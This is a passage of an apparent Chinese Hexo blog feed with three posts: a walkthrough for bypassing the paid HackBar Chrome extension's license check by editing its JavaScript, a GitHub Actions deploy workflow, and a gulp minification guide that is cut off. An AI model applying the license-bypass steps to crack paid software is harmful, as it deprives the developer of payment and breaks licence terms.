        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p><p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/price.jpg" loading="lazy" class="" title="[官网价格]"><p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p><p>未破解前的hackbar是这样的，按钮没法用，显示一个红框</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/not-hack.jpg" loading="lazy" class="" title="[破解前]"><p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p><h2 id="破解插件"><a href="#破解插件" class="headerlink" title="破解插件"></a>破解插件</h2><h3 id="找到插件路径"><a href="#找到插件路径" class="headerlink" title="找到插件路径"></a>找到插件路径</h3><p>首先我们需要在官网上找到插件的安装地址并进行安装</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/install.jpg" loading="lazy" class="" title="[install]"><p>安装后插件会存放在我们电脑的本地</p><p>在chrome中打开 <a href="chrome://version/">version</a> 页面，可以在 <code>个人资料路径</code> 位置找到Chrome浏览器数据的存放位置</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/chrome-version.jpg" loading="lazy" class="" title="[version页面]"><p>我们在文件管理器中打开这个路径，找到里面的<code>Extension</code>目录，这个目录里面就存放了我们的所有扩展插件</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/dirpath.jpg" loading="lazy" class="" title="[插件位置]"><p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p><h3 id="分析授权验证"><a href="#分析授权验证" class="headerlink" title="分析授权验证"></a>分析授权验证</h3><p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 授权验证失败</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">disable_hackbar</span>(<span class="params">message=null</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 将hidden属性移除，就会显示输入证书的红框</span></span><br><span class="line">    $(<span class="string">'#alert-license'</span>).removeClass(<span class="string">'hidden'</span>);</span><br><span class="line">    <span class="comment">// 如果有消息，就在证书那个红框显示出来</span></span><br><span class="line">    <span class="keyword">if</span>(message)&#123;</span><br><span class="line">        $(<span class="string">'#alert-license span'</span>).text(message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 标记证书无效</span></span><br><span class="line">    license_ok = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从chrome本地存储中获取都license内容</span></span><br><span class="line">chrome.storage.local.get([<span class="string">'license'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> license = result.license;</span><br><span class="line">    <span class="comment">// 如果证书内容存在</span></span><br><span class="line">    <span class="keyword">if</span> (license) &#123;</span><br><span class="line">        <span class="comment">//通过链接谷歌服务器检查网络情况</span></span><br><span class="line">        fetch(<span class="string">"https://google.com"</span>)</span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 从证书服务器检查证书</span></span><br><span class="line">                fetch(license_server + <span class="string">"/"</span> + license)</span><br><span class="line">                    .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> response.json();</span><br><span class="line">                    &#125;)</span><br><span class="line">                    .then(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                        <span class="comment">// 无效的证书会返回</span></span><br><span class="line">                        <span class="comment">// &#123;"pong":false,"message":"License is invalid"&#125;</span></span><br><span class="line">                        <span class="keyword">const</span> pong = data.pong;</span><br><span class="line">                        <span class="keyword">if</span> (pong === <span class="literal">false</span>) &#123;</span><br><span class="line">                            <span class="comment">// 证书无效，调用函数显示红框并使功能不可用</span></span><br><span class="line">                            disable_hackbar(data.message);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="comment">// 授权服务器连接不上</span></span><br><span class="line">                        disable_hackbar();</span><br><span class="line">                    &#125;);</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 证书不存在，直接禁用插件</span></span><br><span class="line">        disable_hackbar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"><span class="comment">// 证书检查函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_license</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 检查 license_ok 标记</span></span><br><span class="line">    <span class="keyword">if</span>(!license_ok)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Please input valid license!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进行破解"><a href="#进行破解" class="headerlink" title="进行破解"></a>进行破解</h3><p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p><ul><li><code>license_ok</code> 一开始是 <code>true</code></li><li>证书检查失败的红框一开始是隐藏的</li><li>授权验证失败调用的是 <code>disable_hackbar()</code> 函数</li><li>只在一处地方会向 服务器 检查证书状况</li><li>其他地方都是通过 <code>check_license()</code> 也就是 <code>license_ok</code> 标记检查授权的</li></ul><p>也就是说，一共有两个关键点：</p><ol><li>证书检查失败的红框</li><li>功能的正常使用</li></ol><p>针对证书检查失败的红框，只需要 <code>disable_hackbar</code> 函数不运行 或者 里面去除<code>hidden</code>标记的代码不运行，就不会显示红框了</p><p>针对功能的正常使用，有很多办法可以达到：</p><ol><li>首先我们知道，这些功能都是在调用 <code>check_license()</code> 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉</li><li>我们还发现， <code>check_license()</code> 函数是通过 <code>license_ok</code> 标记检查授权的，所以我们可以在检查前将 <code>license_ok</code> 标记为 <code>true</code>，或者说将前面标记 <code>license_ok = false</code> 的代码注释掉</li></ol><p>最后我们发现，红框一开始是不显示的，<code>license_ok</code>一开始是<code>true</code>的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、<code>license_ok</code>为<code>false</code>，所以那段代码直接删除了就ok了</p><blockquote><p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p></blockquote><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p><p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p><p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p><p>左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/chrome-import.jpg" loading="lazy" class="" title="[插件安装]"><p>通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用</p><blockquote><p>当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布<br>这样所有人都可以安装了，当然推荐是 <strong>不公开</strong> 的发布模式</p></blockquote><p>安装后，按F12，插件就可以正常使用了</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/hack-hackbar/hack-hackbar-done.jpg" loading="lazy" class="" title="[破解后]"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackBar </tag>
            
            <tag> CTF </tag>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Github Actions对Hexo博客自动部署</title>
      <link href="/2020/use-github-actions-to-auto-deploy-hexo.html"/>
      <url>/2020/use-github-actions-to-auto-deploy-hexo.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 <code>hexo g</code> 生成静态网页，然后 <code>hexo d</code> 将public目录推送到github、coding、gitee等平台。</p><p>但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="开启actions功能"><a href="#开启actions功能" class="headerlink" title="开启actions功能"></a>开启actions功能</h3><p>在我们博客的github仓库顶部可以找到 Actions 菜单，在里面我们可以搜索、选择各种预备好的actions模板，也可以点击 <code>Set up a workflow yourself</code> 按钮创建自己的工作流。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/use-github-actions-to-auto-deploy-hexo/github1.jpg" loading="lazy" class="" title="[github actions]"><p>这里我的部署工作稍微复杂点，所以选择自己编写工作流配置文件。</p><p>在手动编写面板的右侧可以搜索别人写好的各种actions，方便我们使用这些actions配置一些基本的工作</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/use-github-actions-to-auto-deploy-hexo/action-mark.jpg" loading="lazy" class="" title="[github actions marketplace]"><p>当然，也可以选择在 hexo 根目录下创建 <code>.github/workflows</code> 目录，并在里面编写github actions配置文件的方法来开启这个功能。</p><h3 id="基本部署"><a href="#基本部署" class="headerlink" title="基本部署"></a>基本部署</h3><p>首先我们需要将git库的代码检出到github actions提供的容器中，这里使用github提供的checkout步骤</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">submodules:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>因为hexo需要依赖node.js环境，所以我们还要安装node环境</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">node-version:</span> <span class="number">12.</span><span class="string">x</span></span><br></pre></td></tr></table></figure><p>有了node环境后我们需要安装各种依赖包</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Installation</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">    <span class="string">npm</span> <span class="string">install</span></span><br><span class="line">    <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br></pre></td></tr></table></figure><p>依赖装好后就可以执行命令生成静态网站了</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span></span><br></pre></td></tr></table></figure><p>最后一步就是将生成的public目录推到github仓库的page分支上，这样github pages就会将最新的网站自动部署了</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">  <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">publish_dir:</span> <span class="string">./public</span></span><br><span class="line">    <span class="attr">cname:</span> <span class="string">g.blog.lgf.im</span></span><br></pre></td></tr></table></figure><h3 id="增加更多功能"><a href="#增加更多功能" class="headerlink" title="增加更多功能"></a>增加更多功能</h3><p>在github actions工作流中，还可以完成更多更复杂的操作，里面可以直接执行shell脚本，可以使用docker镜像提供的特殊环境，大家可以根据自己需求进行修改。</p><h2 id="完整配置文件"><a href="#完整配置文件" class="headerlink" title="完整配置文件"></a>完整配置文件</h2><p>我的配置文件是适合我自己博客用的，里面还包括了网页、js、css、图片的压缩，cdn链接的替换，自动打release方便绕过jsDelivr的缓存。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">CICD</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">hexo</span> <span class="string">build</span> <span class="string">&amp;</span> <span class="string">deploy</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">submodules:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="number">12.</span><span class="string">x</span>  </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">replace</span> <span class="string">cdn</span> <span class="string">url</span></span><br><span class="line">      <span class="attr">id:</span> <span class="string">replace</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">tagname=$(date</span> <span class="string">+%y%j%H%M)</span></span><br><span class="line">        <span class="string">sed</span> <span class="string">-i</span> <span class="string">"s/hexoblog/hexoblog@$tagname/g"</span> <span class="string">_config.yml</span></span><br><span class="line">        <span class="string">sed</span> <span class="string">-i</span> <span class="string">"s/hexoblog/hexoblog@$tagname/g"</span> <span class="string">themes/cactus/_config.yml</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">"::set-output name=tagname::$tagname"</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span> <span class="string">gulp</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">gulp</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">d</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">publish_dir:</span> <span class="string">./public</span></span><br><span class="line">        <span class="attr">cname:</span> <span class="string">g.blog.lgf.im</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Create</span> <span class="string">Release</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/create-release@latest</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">tag_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.replace.outputs.tagname</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">release_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.replace.outputs.tagname</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">body:</span> <span class="string">Automatic</span> <span class="string">generated</span></span><br><span class="line">        <span class="attr">draft:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">prerelease:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><blockquote><p>在github actions将page专用分支更新后，zeit\netlify\github pages三个平台都会自动将最新的内容部署上，这样我就只需要关注博客内容，后续操作都不需要管了</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> coding </tag>
            
            <tag> Github </tag>
            
            <tag> CICD </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加快Github Pages国内访问速度</title>
      <link href="/2020/speedup-github-page.html"/>
      <url>/2020/speedup-github-page.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信不少小伙伴都在使用Github Pages提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用Github Pages搭建的网站速度普遍不快，因此很多小伙伴只能转战国内付费的服务器和CDN。</p><p>正巧我也在使用Github Pages搭建自己的静态博客，正好来说一下我的优化方法。</p><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><p>默认情况下，如果我们查看Hexo生成的静态网页源代码，会发现存在大量的空格、空行、注释等无用内容。同样的，如果使用的hexo主题没有进行优化，大量的css和js文件也存在这样的垃圾内容。</p><p>如果你在一些大型网站右键查看网页源代码，你会发现他们的html\js\css是经过压缩处理的，没有多余的换行和注释，这势必会节省带宽流量和传输时间，提升用户体验。</p><p>所以我们优化速度的第一关就是对Hexo生成的代码进行压缩。</p><p>这里我使用的工具是 gulp</p><h3 id="安装gulp"><a href="#安装gulp" class="headerlink" title="安装gulp"></a>安装gulp</h3><p>在自己本机安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp -g</span><br></pre></td></tr></table></figure><p>为了Github Action或其他CI\CD平台也能够进行安装，这里推荐</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp --save-dev</span><br></pre></td></tr></table></figure><p>我们还需要一些依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev \</span><br><span class="line">            gulp-minify-css \</span><br><span class="line">            gulp-babel \</span><br><span class="line">            gulp-uglify \</span><br><span class="line">            gulp-htmlmin \</span><br><span class="line">            gulp-htmlclean \</span><br><span class="line">            gulp-imagemin \</span><br><span class="line">            imagemin-jpegtran \</span><br><span class="line">            imagemin-svgo \</span><br><span class="line">            imagemin-gifsicle \</span><br><span class="line">            imagemin-optipng</span><br></pre></td></tr></table></figure><h3 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h3><p>在博客hexo的根目录下，新建 <code>gulpfile.js</code> 配置文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> minifycss = <span class="built_in">require</span>(<span class="string">'gulp-minify-css'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">'gulp-htmlmin'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">'gulp-htmlclean'</span>);</span><br><span class="line"><span class="keyword">var</span> imagemin = <span class="built_in">require</span>(<span class="string">'gulp-imagemin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩css文件</span></span><br><span class="line">gulp.task(<span class="string">'minify-css'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.css'</span>)</span><br><span class="line">  .pipe(minifycss())</span><br><span class="line">  .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩html</span></span><br><span class="line">gulp.task(<span class="string">'minify-html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.html'</span>)</span><br><span class="line">      .pipe(htmlclean())</span><br><span class="line">      .pipe(htmlmin(&#123;</span><br><span class="line">          collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">          collapseBooleanAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeComments: <span class="literal">true</span>,</span><br><span class="line">          removeEmptyAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeScriptTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeStyleLinkTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">          minifyJS: <span class="literal">true</span>,</span><br><span class="line">          minifyCSS: <span class="literal">true</span>,</span><br><span class="line">          minifyURLs: <span class="literal">true</span>,</span><br><span class="line">          ignoreCustomFragments: [ <span class="regexp">/\&#123;\&#123;[\s\S]*?\&#125;\&#125;/</span> ],</span><br><span class="line">      &#125;))</span><br><span class="line">      .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩js文件</span></span><br><span class="line">gulp.task(<span class="string">'minify-js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'./public/**/*.js'</span>,<span class="string">'!./public/js/**/*min.js'</span>])</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩图片</span></span><br><span class="line">gulp.task(<span class="string">'minify-images'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'./public/**/*.png'</span>, <span class="string">'./public/**/*.jpg'</span>, <span class="string">'./public/**/*.gif'</span>, <span class="string">'./public/**/*.svg'</span>])</span><br><span class="line">        .pipe(imagemin([</span><br><span class="line">                imagemin.gifsicle(&#123;<span class="attr">interlaced</span>: <span class="literal">true</span>&#125;),</span><br><span class="line">                imagemin.mozjpeg(&#123;<span class="attr">quality</span>: <span class="number">75</span>, <span class="attr">progressive</span>: <span class="literal">true</span>&#125;),</span><br><span class="line">                imagemin.optipng(&#123;<span class="attr">optimizationLevel</span>: <span class="number">5</span>&#125;),</span><br><span class="line">                imagemin.svgo(&#123;</span><br><span class="line">                          plugins: [</span><br><span class="line">                              &#123;<span class="attr">removeViewBox</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">                              &#123;<span class="attr">cleanupIDs</span>: <span class="literal">false</span>&#125;</span><br><span class="line">                          ]</span><br><span class="line">                &#125;)</span><br><span class="line">        ]))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'default'</span>, gulp.series(gulp.parallel(<span class="string">'minify-html'</span>, <span class="string">'minify-css'</span>, <span class="string">'minify-js'</span>, <span class="string">'minify-images'</span>)));</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>在使用 